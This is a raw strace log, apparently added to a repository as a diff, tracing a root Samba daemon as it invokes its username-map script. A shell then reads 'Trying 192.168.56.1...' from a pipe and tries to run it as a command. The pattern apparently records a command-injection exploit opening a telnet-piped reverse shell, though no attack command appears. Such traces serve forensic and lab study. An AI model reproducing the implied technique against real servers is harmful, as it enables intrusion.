+[pid  6370] 22:01:45.016036 mmap2(0xb7fb3000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x2c <unfinished ...>
+[pid  6363] 22:01:45.016043 <... waitpid resumed> 0xbf928248, WNOHANG) = -1 ECHILD (No child processes)
+[pid  6369] 22:01:45.016049 <... _llseek resumed> [0], SEEK_CUR) = 0
+[pid  6370] 22:01:45.016066 <... mmap2 resumed> ) = 0xb7fb3000
+[pid  6363] 22:01:45.016071 sigreturn( <unfinished ...>
+[pid  6369] 22:01:45.016097 fstat64(3,  <unfinished ...>
+[pid  6370] 22:01:45.016113 close(3 <unfinished ...>
+[pid  6363] 22:01:45.016119 <... sigreturn resumed> ) = ? (mask now [FPE USR2 PIPE])
+[pid  6369] 22:01:45.016125 <... fstat64 resumed> {st_mode=S_IFREG|0644, st_size=1581, ...}) = 0
+[pid  6370] 22:01:45.016156 <... close resumed> ) = 0
+[pid  6363] 22:01:45.016161 rt_sigaction(SIGINT, {0x8091fd0, [], 0},  <unfinished ...>
+[pid  6369] 22:01:45.016173 mmap2(NULL, 1581, PROT_READ, MAP_SHARED, 3, 0 <unfinished ...>
+[pid  6370] 22:01:45.016189 access("/etc/ld.so.nohwcap", F_OK <unfinished ...>
+[pid  6363] 22:01:45.016201 <... rt_sigaction resumed> {0x807f150, [], 0}, 8) = 0
+[pid  6369] 22:01:45.016212 <... mmap2 resumed> ) = 0xb7f20000
+[pid  6370] 22:01:45.016341 <... access resumed> ) = -1 ENOENT (No such file or directory)
+[pid  6363] 22:01:45.016348 exit_group(0) = ?
+Process 6363 detached
+[pid  6369] 22:01:45.016355 _llseek(3, 1581,  <unfinished ...>
+[pid  6362] 22:01:45.016401 <... read resumed> "", 128) = 0
+[pid  6370] 22:01:45.016407 open("/usr/lib/libstdc++.so.6", O_RDONLY <unfinished ...>
+[pid  6369] 22:01:45.016419 <... _llseek resumed> [1581], SEEK_SET) = 0
+[pid  6362] 22:01:45.016442 --- SIGCHLD (Child exited) @ 0 (0) ---
+[pid  6370] 22:01:45.016448 <... open resumed> ) = 3
+[pid  6369] 22:01:45.016453 munmap(0xb7f20000, 1581 <unfinished ...>
+[pid  6362] 22:01:45.016468 waitpid(-1,  <unfinished ...>
+[pid  6370] 22:01:45.016474 read(3,  <unfinished ...>
+[pid  6369] 22:01:45.016479 <... munmap resumed> ) = 0
+[pid  6362] 22:01:45.016492 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], WNOHANG) = 6363
+[pid  6370] 22:01:45.016498 <... read resumed> "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0`*\4\000"..., 512) = 512
+[pid  6369] 22:01:45.016514 close(3 <unfinished ...>
+[pid  6362] 22:01:45.016524 waitpid(-1,  <unfinished ...>
+[pid  6370] 22:01:45.016529 fstat64(3,  <unfinished ...>
+[pid  6369] 22:01:45.016535 <... close resumed> ) = 0
+[pid  6362] 22:01:45.016567 <... waitpid resumed> 0xbf9284d8, WNOHANG) = -1 ECHILD (No child processes)
+[pid  6370] 22:01:45.016573 <... fstat64 resumed> {st_mode=S_IFREG|0644, st_size=970680, ...}) = 0
+[pid  6369] 22:01:45.016600 brk(0x8100000 <unfinished ...>
+[pid  6362] 22:01:45.016612 sigreturn( <unfinished ...>
+[pid  6370] 22:01:45.016638 mmap2(NULL, 993036, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0 <unfinished ...>
+[pid  6369] 22:01:45.016645 <... brk resumed> ) = 0x8100000
+[pid  6362] 22:01:45.016663 <... sigreturn resumed> ) = ? (mask now [FPE USR2 PIPE])
+[pid  6370] 22:01:45.016669 <... mmap2 resumed> ) = 0xb7e93000
+[pid  6369] 22:01:45.016674 getpgrp( <unfinished ...>
+[pid  6362] 22:01:45.016683 close(3 <unfinished ...>
+[pid  6370] 22:01:45.016689 mmap2(0xb7f7b000, 20480, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0xe8 <unfinished ...>
+[pid  6369] 22:01:45.016696 <... getpgrp resumed> ) = 4409
+[pid  6362] 22:01:45.016709 <... close resumed> ) = 0
+[pid  6370] 22:01:45.016714 <... mmap2 resumed> ) = 0xb7f7b000
+[pid  6369] 22:01:45.016719 rt_sigaction(SIGCHLD, {0x807e540, [], 0},  <unfinished ...>
+[pid  6362] 22:01:45.016738 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
+[pid  6370] 22:01:45.016748 mmap2(0xb7f80000, 22284, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0 <unfinished ...>
+[pid  6369] 22:01:45.016754 <... rt_sigaction resumed> {SIG_DFL}, 8) = 0
+[pid  6362] 22:01:45.016770 <... rt_sigprocmask resumed> [FPE USR2 PIPE], 8) = 0
+[pid  6370] 22:01:45.016778 <... mmap2 resumed> ) = 0xb7f80000
+[pid  6369] 22:01:45.016783 getrlimit(RLIMIT_NPROC,  <unfinished ...>
+[pid  6362] 22:01:45.016799 rt_sigaction(SIGINT, {0x807f150, [], 0},  <unfinished ...>
+[pid  6370] 22:01:45.016810 close(3 <unfinished ...>
+[pid  6369] 22:01:45.016816 <... getrlimit resumed> {rlim_cur=36*1024, rlim_max=36*1024}) = 0
+[pid  6362] 22:01:45.016834 <... rt_sigaction resumed> {SIG_DFL}, 8) = 0
+[pid  6370] 22:01:45.016844 <... close resumed> ) = 0
+[pid  6369] 22:01:45.016849 brk(0x8101000 <unfinished ...>
+[pid  6362] 22:01:45.016863 rt_sigprocmask(SIG_SETMASK, [FPE USR2 PIPE],  <unfinished ...>
+[pid  6370] 22:01:45.016872 access("/etc/ld.so.nohwcap", F_OK <unfinished ...>
+[pid  6369] 22:01:45.016884 <... brk resumed> ) = 0x8101000
+[pid  6362] 22:01:45.016916 <... rt_sigprocmask resumed> NULL, 8) = 0
+[pid  6370] 22:01:45.016921 <... access resumed> ) = -1 ENOENT (No such file or directory)
+[pid  6369] 22:01:45.016927 rt_sigprocmask(SIG_BLOCK, NULL,  <unfinished ...>
+[pid  6362] 22:01:45.016937 rt_sigaction(SIGINT, {SIG_DFL},  <unfinished ...>
+[pid  6370] 22:01:45.016948 open("/lib/tls/i686/cmov/libm.so.6", O_RDONLY <unfinished ...>
+[pid  6369] 22:01:45.016961 <... rt_sigprocmask resumed> [FPE USR2 PIPE], 8) = 0
+[pid  6362] 22:01:45.016980 <... rt_sigaction resumed> {0x807f150, [], 0}, 8) = 0
+[pid  6370] 22:01:45.016990 <... open resumed> ) = 3
+[pid  6369] 22:01:45.016995 fcntl64(0, F_GETFL <unfinished ...>
+[pid  6362] 22:01:45.017021 rt_sigaction(SIGINT, {SIG_DFL},  <unfinished ...>
+[pid  6370] 22:01:45.017033 read(3,  <unfinished ...>
+[pid  6369] 22:01:45.017038 <... fcntl64 resumed> ) = 0 (flags O_RDONLY)
+[pid  6362] 22:01:45.017051 <... rt_sigaction resumed> {SIG_DFL}, 8) = 0
+[pid  6370] 22:01:45.017061 <... read resumed> "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@4\0\000"..., 512) = 512
+[pid  6369] 22:01:45.017076 fstat64(0,  <unfinished ...>
+[pid  6362] 22:01:45.017086 rt_sigaction(SIGQUIT, {SIG_DFL},  <unfinished ...>
+[pid  6370] 22:01:45.017097 fstat64(3,  <unfinished ...>
+[pid  6369] 22:01:45.017102 <... fstat64 resumed> {st_mode=S_IFIFO|0600, st_size=0, ...}) = 0
+[pid  6362] 22:01:45.017133 <... rt_sigaction resumed> {SIG_IGN}, 8) = 0
+[pid  6370] 22:01:45.017142 <... fstat64 resumed> {st_mode=S_IFREG|0644, st_size=149328, ...}) = 0
+[pid  6369] 22:01:45.017169 _llseek(0, 0,  <unfinished ...>
+[pid  6362] 22:01:45.017179 rt_sigaction(SIGCHLD, {SIG_DFL},  <unfinished ...>
+[pid  6370] 22:01:45.017190 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0 <unfinished ...>
+[pid  6369] 22:01:45.017196 <... _llseek resumed> 0xbfd478a0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
+[pid  6362] 22:01:45.017207 <... rt_sigaction resumed> {0x807e540, [], 0}, 8) = 0
+[pid  6370] 22:01:45.017218 <... mmap2 resumed> ) = 0xb7e92000
+[pid  6369] 22:01:45.017223 rt_sigprocmask(SIG_BLOCK, NULL,  <unfinished ...>
+[pid  6362] 22:01:45.017237 execve("/etc/samba/scripts/mapusers.sh", ["/etc/samba/scripts/mapusers.sh", "/="], [/* 15 vars */] <unfinished ...>
+[pid  6370] 22:01:45.052775 mmap2(NULL, 147584, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0 <unfinished ...>
+[pid  6369] 22:01:45.052847 <... rt_sigprocmask resumed> [FPE USR2 PIPE], 8) = 0
+[pid  6370] 22:01:45.057746 <... mmap2 resumed> ) = 0xb7e6d000
+[pid  6369] 22:01:45.057746 read(0,  <unfinished ...>
+[pid  6370] 22:01:45.057749 mmap2(0xb7e90000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x23 <unfinished ...>
+[pid  6369] 22:01:45.057758 <... read resumed> "T", 1) = 1
+[pid  6370] 22:01:45.057774 <... mmap2 resumed> ) = 0xb7e90000
+[pid  6369] 22:01:45.057780 read(0,  <unfinished ...>
+[pid  6370] 22:01:45.057797 close(3 <unfinished ...>
+[pid  6369] 22:01:45.057803 <... read resumed> "r", 1) = 1
+[pid  6370] 22:01:45.057812 <... close resumed> ) = 0
+[pid  6369] 22:01:45.057817 read(0,  <unfinished ...>
+[pid  6370] 22:01:45.057832 access("/etc/ld.so.nohwcap", F_OK <unfinished ...>
+[pid  6369] 22:01:45.057845 <... read resumed> "y", 1) = 1
+[pid  6370] 22:01:45.057854 <... access resumed> ) = -1 ENOENT (No such file or directory)
+[pid  6369] 22:01:45.057860 read(0,  <unfinished ...>
+[pid  6370] 22:01:45.057872 open("/lib/libgcc_s.so.1", O_RDONLY <unfinished ...>
+[pid  6369] 22:01:45.057883 <... read resumed> "i", 1) = 1
+[pid  6370] 22:01:45.057893 <... open resumed> ) = 3
+[pid  6369] 22:01:45.057898 read(0,  <unfinished ...>
+[pid  6370] 22:01:45.057906 read(3,  <unfinished ...>
+[pid  6369] 22:01:45.057912 <... read resumed> "n", 1) = 1
+[pid  6370] 22:01:45.057921 <... read resumed> "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\31\0\000"..., 512) = 512
+[pid  6369] 22:01:45.057938 read(0,  <unfinished ...>
+[pid  6370] 22:01:45.057947 fstat64(3,  <unfinished ...>
+[pid  6369] 22:01:45.057952 <... read resumed> "g", 1) = 1
+[pid  6370] 22:01:45.057961 <... fstat64 resumed> {st_mode=S_IFREG|0644, st_size=42700, ...}) = 0
+[pid  6369] 22:01:45.057989 read(0,  <unfinished ...>
+[pid  6370] 22:01:45.057999 mmap2(NULL, 41700, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0 <unfinished ...>
+[pid  6369] 22:01:45.058005 <... read resumed> " ", 1) = 1
+[pid  6370] 22:01:45.058015 <... mmap2 resumed> ) = 0xb7e62000
+[pid  6369] 22:01:45.058020 read(0,  <unfinished ...>
+[pid  6370] 22:01:45.058029 mmap2(0xb7e6c000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0xa <unfinished ...>
+[pid  6369] 22:01:45.058035 <... read resumed> "1", 1) = 1
+[pid  6370] 22:01:45.058046 <... mmap2 resumed> ) = 0xb7e6c000
+[pid  6369] 22:01:45.058051 read(0,  <unfinished ...>
+[pid  6370] 22:01:45.058063 close(3 <unfinished ...>
+[pid  6369] 22:01:45.058068 <... read resumed> "9", 1) = 1
+[pid  6370] 22:01:45.058077 <... close resumed> ) = 0
+[pid  6369] 22:01:45.058081 read(0,  <unfinished ...>
+[pid  6370] 22:01:45.058094 access("/etc/ld.so.nohwcap", F_OK <unfinished ...>
+[pid  6369] 22:01:45.058105 <... read resumed> "2", 1) = 1
+[pid  6370] 22:01:45.058114 <... access resumed> ) = -1 ENOENT (No such file or directory)
+[pid  6369] 22:01:45.058119 read(0,  <unfinished ...>
+[pid  6370] 22:01:45.058128 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY <unfinished ...>
+[pid  6369] 22:01:45.058142 <... read resumed> ".", 1) = 1
+[pid  6370] 22:01:45.058152 <... open resumed> ) = 3
+[pid  6369] 22:01:45.058157 read(0,  <unfinished ...>
+[pid  6370] 22:01:45.058165 read(3,  <unfinished ...>
+[pid  6369] 22:01:45.058170 <... read resumed> "1", 1) = 1
+[pid  6370] 22:01:45.058179 <... read resumed> "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1"..., 512) = 512
+[pid  6369] 22:01:45.058195 read(0,  <unfinished ...>
+[pid  6370] 22:01:45.058203 fstat64(3,  <unfinished ...>
+[pid  6369] 22:01:45.058209 <... read resumed> "6", 1) = 1
+[pid  6370] 22:01:45.058217 <... fstat64 resumed> {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
+[pid  6369] 22:01:45.058244 read(0,  <unfinished ...>
+[pid  6370] 22:01:45.058254 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0 <unfinished ...>
+[pid  6369] 22:01:45.058260 <... read resumed> "8", 1) = 1
+[pid  6370] 22:01:45.058269 <... mmap2 resumed> ) = 0xb7d13000
+[pid  6369] 22:01:45.058275 read(0,  <unfinished ...>
+[pid  6370] 22:01:45.058284 mmap2(0xb7e5c000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x149 <unfinished ...>
+[pid  6369] 22:01:45.058290 <... read resumed> ".", 1) = 1
+[pid  6370] 22:01:45.058301 <... mmap2 resumed> ) = 0xb7e5c000
+[pid  6369] 22:01:45.058306 read(0,  <unfinished ...>
+[pid  6370] 22:01:45.058318 mmap2(0xb7e5f000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0 <unfinished ...>
+[pid  6369] 22:01:45.058324 <... read resumed> "5", 1) = 1
+[pid  6370] 22:01:45.058334 <... mmap2 resumed> ) = 0xb7e5f000
+[pid  6369] 22:01:45.058339 read(0,  <unfinished ...>
+[pid  6370] 22:01:45.058352 close(3 <unfinished ...>
+[pid  6369] 22:01:45.058357 <... read resumed> "6", 1) = 1
+[pid  6370] 22:01:45.058365 <... close resumed> ) = 0
+[pid  6369] 22:01:45.058370 read(0,  <unfinished ...>
+[pid  6370] 22:01:45.058385 access("/etc/ld.so.nohwcap", F_OK <unfinished ...>
+[pid  6369] 22:01:45.058397 <... read resumed> ".", 1) = 1
+[pid  6370] 22:01:45.058406 <... access resumed> ) = -1 ENOENT (No such file or directory)
+[pid  6369] 22:01:45.058411 read(0,  <unfinished ...>
+[pid  6370] 22:01:45.058420 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY <unfinished ...>
+[pid  6369] 22:01:45.058434 <... read resumed> "1", 1) = 1
+[pid  6370] 22:01:45.058444 <... open resumed> ) = 3
+[pid  6369] 22:01:45.058449 read(0,  <unfinished ...>
+[pid  6370] 22:01:45.058457 read(3,  <unfinished ...>
+[pid  6369] 22:01:45.058463 <... read resumed> ".", 1) = 1
+[pid  6370] 22:01:45.058472 <... read resumed> "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\000"..., 512) = 512
+[pid  6369] 22:01:45.058488 read(0,  <unfinished ...>
+[pid  6370] 22:01:45.058496 fstat64(3,  <unfinished ...>
+[pid  6369] 22:01:45.058502 <... read resumed> ".", 1) = 1
+[pid  6370] 22:01:45.058510 <... fstat64 resumed> {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
+[pid  6369] 22:01:45.058537 read(0,  <unfinished ...>
+[pid  6370] 22:01:45.058547 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0 <unfinished ...>
+[pid  6369] 22:01:45.058553 <... read resumed> ".", 1) = 1
+[pid  6370] 22:01:45.058562 <... mmap2 resumed> ) = 0xb7d0f000
+[pid  6369] 22:01:45.058567 read(0,  <unfinished ...>
+[pid  6370] 22:01:45.058576 mmap2(0xb7d11000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1 <unfinished ...>
+[pid  6369] 22:01:45.058582 <... read resumed> "\n", 1) = 1
+[pid  6370] 22:01:45.058635 <... mmap2 resumed> ) = 0xb7d11000
+[pid  6369] 22:01:45.058641 stat64(".",  <unfinished ...>
+[pid  6370] 22:01:45.058658 close(3 <unfinished ...>
+[pid  6369] 22:01:45.058664 <... stat64 resumed> {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
+[pid  6370] 22:01:45.058694 <... close resumed> ) = 0
+[pid  6369] 22:01:45.058699 stat64("/sbin/Trying",  <unfinished ...>
+[pid  6370] 22:01:45.058732 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0 <unfinished ...>
+[pid  6369] 22:01:45.058739 <... stat64 resumed> 0xbfd476a8) = -1 ENOENT (No such file or directory)
+[pid  6370] 22:01:45.058749 <... mmap2 resumed> ) = 0xb7d0e000
+[pid  6369] 22:01:45.058754 stat64("/bin/Trying",  <unfinished ...>
+[pid  6370] 22:01:45.058769 set_thread_area({entry_number:-1 ->  <unfinished ...>
+[pid  6369] 22:01:45.058779 <... stat64 resumed> 0xbfd476a8) = -1 ENOENT (No such file or directory)
+[pid  6370] 22:01:45.058787 <... set_thread_area resumed> 6, base_addr:0xb7d0e940, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
+[pid  6369] 22:01:45.058797 stat64("/usr/sbin/Trying",  <unfinished ...>
+[pid  6370] 22:01:45.058870 mprotect(0xb7e5c000, 4096, PROT_READ <unfinished ...>
+[pid  6369] 22:01:45.058876 <... stat64 resumed> 0xbfd476a8) = -1 ENOENT (No such file or directory)
+[pid  6362] 22:01:45.110422 <... execve resumed> ) = -1 ENOEXEC (Exec format error)
+[pid  6370] 22:01:45.110441 <... mprotect resumed> ) = 0
+[pid  6369] 22:01:45.110728 stat64("/usr/bin/Trying",  <unfinished ...>
+[pid  6362] 22:01:45.110742 open("/etc/samba/scripts/mapusers.sh", O_RDONLY|O_LARGEFILE <unfinished ...>
+[pid  6370] 22:01:45.110758 mprotect(0xb7f7b000, 12288, PROT_READ <unfinished ...>
+[pid  6369] 22:01:45.110773 <... stat64 resumed> 0xbfd476a8) = -1 ENOENT (No such file or directory)
+[pid  6362] 22:01:45.110779 <... open resumed> ) = 3
+[pid  6369] 22:01:45.110792 rt_sigprocmask(SIG_BLOCK, [INT CHLD],  <unfinished ...>
+[pid  6362] 22:01:45.110804 read(3,  <unfinished ...>
+[pid  6369] 22:01:45.110812 <... rt_sigprocmask resumed> [FPE USR2 PIPE], 8) = 0
+[pid  6362] 22:01:45.110820 <... read resumed> "", 80) = 0
+[pid  6369] 22:01:45.110831 clone( <unfinished ...>
+[pid  6362] 22:01:45.110837 close(3Process 6377 attached
+ <unfinished ...>
+[pid  6369] 22:01:45.110884 <... clone resumed> child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7d946f8) = 6377
+[pid  6362] 22:01:45.110891 <... close resumed> ) = 0
+[pid  6362] 22:01:45.110957 exit_group(0) = ?
+Process 6361 resumed
+Process 6362 detached
+[pid  6377] 22:01:45.110967 rt_sigprocmask(SIG_SETMASK, [FPE USR2 PIPE],  <unfinished ...>
+[pid  6361] 22:01:45.111018 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 6362
+[pid  6377] 22:01:45.111027 <... rt_sigprocmask resumed> NULL, 8) = 0
+[pid  6361] 22:01:45.111042 --- SIGCHLD (Child exited) @ 0 (0) ---
+[pid  6377] 22:01:45.111049 rt_sigaction(SIGTSTP, {SIG_DFL},  <unfinished ...>
+[pid  6361] 22:01:45.111064 sigreturn( <unfinished ...>
+[pid  6377] 22:01:45.111074 <... rt_sigaction resumed> {SIG_DFL}, 8) = 0
+[pid  6361] 22:01:45.111074 <... sigreturn resumed> ) = ? (mask now [FPE USR2 PIPE])
+[pid  6377] 22:01:45.111074 rt_sigaction(SIGTTIN, {SIG_DFL},  <unfinished ...>
+[pid  6361] 22:01:45.111074 rt_sigaction(SIGCHLD, {0xb7e24590, [CHLD], SA_RESTART},  <unfinished ...>
+[pid  6377] 22:01:45.111074 <... rt_sigaction resumed> {SIG_DFL}, 8) = 0
+[pid  6361] 22:01:45.111074 <... rt_sigaction resumed> {0xb7e24580, [CHLD], SA_RESTART}, 8) = 0
+[pid  6377] 22:01:45.111074 rt_sigaction(SIGTTOU, {SIG_DFL},  <unfinished ...>
+[pid  6361] 22:01:45.111074 _llseek(21, 0,  <unfinished ...>
+[pid  6377] 22:01:45.111074 <... rt_sigaction resumed> {SIG_DFL}, 8) = 0
+[pid  6361] 22:01:45.111074 <... _llseek resumed> [0], SEEK_SET) = 0
+[pid  6377] 22:01:45.111074 rt_sigaction(SIGINT, {SIG_IGN},  <unfinished ...>
+[pid  6361] 22:01:45.111075 fstat64(21,  <unfinished ...>
+[pid  6377] 22:01:45.111075 <... rt_sigaction resumed> {SIG_IGN}, 8) = 0
+[pid  6361] 22:01:45.111075 <... fstat64 resumed> {st_mode=S_IFREG|0600, st_size=0, ...}) = 0
+[pid  6377] 22:01:45.111075 rt_sigaction(SIGQUIT, {SIG_IGN},  <unfinished ...>
+[pid  6361] 22:01:45.111091 read(21,  <unfinished ...>
+[pid  6377] 22:01:45.111096 <... rt_sigaction resumed> {SIG_IGN}, 8) = 0
+[pid  6361] 22:01:45.111108 <... read resumed> "", 0) = 0
+[pid  6377] 22:01:45.111114 rt_sigaction(SIGCHLD, {SIG_DFL},  <unfinished ...>
+[pid  6361] 22:01:45.111130 close(21 <unfinished ...>
+[pid  6377] 22:01:45.111135 <... rt_sigaction resumed> {0x807e540, [], 0}, 8) = 0
+[pid  6361] 22:01:45.111245 <... close resumed> ) = 0
+[pid  6377] 22:01:45.111251 write(2, "sh: line 1: Trying: command not "..., 38 <unfinished ...>
+[pid  6361] 22:01:45.111306 geteuid32( <unfinished ...>
+[pid  6377] 22:01:45.111312 <... write resumed> ) = 38
+[pid  6361] 22:01:45.111392 <... geteuid32 resumed> ) = 0
+[pid  6377] 22:01:45.111397 exit_group(127) = ?
+Process 6377 detached
+[pid  6361] 22:01:45.111428 getegid32() = 0
+[pid  6370] 22:01:45.111441 <... mprotect resumed> ) = 0
+[pid  6361] 22:01:45.111446 getgroups32(0,  <unfinished ...>
+[pid  6370] 22:01:45.111487 munmap(0xb7fb6000, 29338 <unfinished ...>
+[pid  6361] 22:01:45.111493 <... getgroups32 resumed> []) = 0
+[pid  6361] 22:01:45.111500 geteuid32() = 0
+[pid  6361] 22:01:45.111509 getegid32( <unfinished ...>
+[pid  6370] 22:01:45.111519 <... munmap resumed> ) = 0
+[pid  6361] 22:01:45.111523 <... getegid32 resumed> ) = 0
+[pid  6370] 22:01:45.111565 brk(0 <unfinished ...>
+[pid  6361] 22:01:45.111565 setgroups32(0, []) = 0
+[pid  6361] 22:01:45.111565 setresgid32(-1, 0, -1) = 0
+[pid  6361] 22:01:45.111565 getegid32() = 0
+[pid  6361] 22:01:45.111565 setresuid32(0, 0, -1) = 0
+[pid  6361] 22:01:45.111566 geteuid32() = 0
+[pid  6361] 22:01:45.111566 open("/var/lib/samba/passdb.tdb", O_RDONLY|O_LARGEFILE) = 21
+[pid  6361] 22:01:45.111566 read(21, "TDB file\n\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"..., 168) = 168
+[pid  6361] 22:01:45.111566 fstat64(21, {st_mode=S_IFREG|0600, st_size=16384, ...}) = 0
+[pid  6361] 22:01:45.111566 brk(0xb8038000) = 0xb8038000
+[pid  6361] 22:01:45.111566 mmap2(NULL, 16384, PROT_READ, MAP_SHARED, 21, 0) = 0xb786a000
+[pid  6361] 22:01:45.111567 munmap(0xb786a000, 16384) = 0
+[pid  6361] 22:01:45.111567 close(21)   = 0
+[pid  6361] 22:01:45.111567 geteuid32() = 0
+[pid  6361] 22:01:45.111567 getegid32( <unfinished ...>
+[pid  6370] 22:01:45.111613 <... brk resumed> ) = 0x805d000
+[pid  6361] 22:01:45.111618 <... getegid32 resumed> ) = 0
+[pid  6370] 22:01:45.111625 brk(0x8082000 <unfinished ...>
+[pid  6361] 22:01:45.111630 setgroups32(0, [] <unfinished ...>
+[pid  6370] 22:01:45.111638 <... brk resumed> ) = 0x8082000
+[pid  6361] 22:01:45.111643 <... setgroups32 resumed> ) = 0
+[pid  6370] 22:01:45.111683 rt_sigaction(SIGTSTP, {0x8053270, [TSTP], SA_RESTART},  <unfinished ...>
+[pid  6361] 22:01:45.111696 setresgid32(-1, 0, -1 <unfinished ...>
+[pid  6370] 22:01:45.111705 <... rt_sigaction resumed> {SIG_DFL}, 8) = 0
+[pid  6361] 22:01:45.111714 <... setresgid32 resumed> ) = 0
+[pid  6370] 22:01:45.111726 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS <unfinished ...>
+[pid  6361] 22:01:45.111733 getegid32( <unfinished ...>
+[pid  6370] 22:01:45.111741 <... ioctl resumed> , 0xbfaf97c8) = -1 EINVAL (Invalid argument)
+[pid  6361] 22:01:45.111746 <... getegid32 resumed> ) = 0
+[pid  6370] 22:01:45.111763 rt_sigprocmask(SIG_BLOCK, NULL,  <unfinished ...>
+[pid  6361] 22:01:45.111769 setresuid32(0, 0, -1 <unfinished ...>
+[pid  6370] 22:01:45.111777 <... rt_sigprocmask resumed> [FPE USR2 PIPE], 8) = 0
+[pid  6361] 22:01:45.111785 <... setresuid32 resumed> ) = 0
+[pid  6370] 22:01:45.111810 socket(PF_NETLINK, SOCK_RAW, 0 <unfinished ...>
+[pid  6361] 22:01:45.111816 geteuid32( <unfinished ...>
+[pid  6370] 22:01:45.111828 <... socket resumed> ) = 3
+[pid  6361] 22:01:45.111833 <... geteuid32 resumed> ) = 0
+[pid  6370] 22:01:45.111856 bind(3, {sa_family=AF_NETLINK, pid=0, groups=00000000}, 12 <unfinished ...>
+[pid  6361] 22:01:45.111866 write(5, "\0\0\0#\377SMBsm\0\0\300\210\1@\0\0\0\0\0\0\0\0\0\0\0\0"..., 39 <unfinished ...>
+[pid  6370] 22:01:45.111949 <... bind resumed> ) = 0
+[pid  6361] 22:01:45.111955 <... write resumed> ) = 39
+[pid  6370] 22:01:45.111973 getsockname(3,  <unfinished ...>
+[pid  6361] 22:01:45.111979 select(26, [5 22 25], NULL, NULL, {60, 0} <unfinished ...>
+[pid  6370] 22:01:45.111995 <... getsockname resumed> {sa_family=AF_NETLINK, pid=6370, groups=00000000}, [12]) = 0
+[pid  6370] 22:01:45.112033 time(NULL)  = 1478487705
+[pid  6370] 22:01:45.112049 sendto(3, "\24\0\0\0\26\0\1\3\231\356\37X\0\0\0\0\0\0\0\0", 20, 0, {sa_family=AF_NETLINK, pid=0, groups=00000000}, 12) = 20
+[pid  6370] 22:01:45.112080 recvmsg(3, {msg_name(12)={sa_family=AF_NETLINK, pid=0, groups=00000000}, msg_iov(1)=[{"0\0\0\0\24\0\2\0\231\356\37X\342\30\0\0\2\10\200\376\1"..., 4096}], msg_controllen=0, msg_flags=0}, 0) = 108
+[pid  6370] 22:01:45.112121 recvmsg(3, {msg_name(12)={sa_family=AF_NETLINK, pid=0, groups=00000000}, msg_iov(1)=[{"@\0\0\0\24\0\2\0\231\356\37X\342\30\0\0\n\200\200\376\1"..., 4096}], msg_controllen=0, msg_flags=0}, 0) = 128
+[pid  6370] 22:01:45.112158 recvmsg(3, {msg_name(12)={sa_family=AF_NETLINK, pid=0, groups=00000000}, msg_iov(1)=[{"\24\0\0\0\3\0\2\0\231\356\37X\342\30\0\0\0\0\0\0\1\0\0"..., 4096}], msg_controllen=0, msg_flags=0}, 0) = 20
+[pid  6369] 22:01:45.149819 rt_sigprocmask(SIG_SETMASK, [FPE USR2 PIPE],  <unfinished ...>
+[pid  6370] 22:01:45.150118 close(3 <unfinished ...>
+[pid  6369] 22:01:45.150162 <... rt_sigprocmask resumed> NULL, 8) = 0
+[pid  6370] 22:01:45.150230 <... close resumed> ) = 0
+[pid  6369] 22:01:45.150243 --- SIGCHLD (Child exited) @ 0 (0) ---
+[pid  6370] 22:01:45.150327 fstat64(1,  <unfinished ...>
+[pid  6369] 22:01:45.150334 waitpid(-1,  <unfinished ...>
+[pid  6370] 22:01:45.150346 <... fstat64 resumed> {st_mode=S_IFCHR|0666, st_rdev=makedev(1, 3), ...}) = 0
+[pid  6369] 22:01:45.150374 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 127}], WNOHANG) = 6377
+[pid  6370] 22:01:45.150387 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS <unfinished ...>
+[pid  6369] 22:01:45.150394 waitpid(-1,  <unfinished ...>
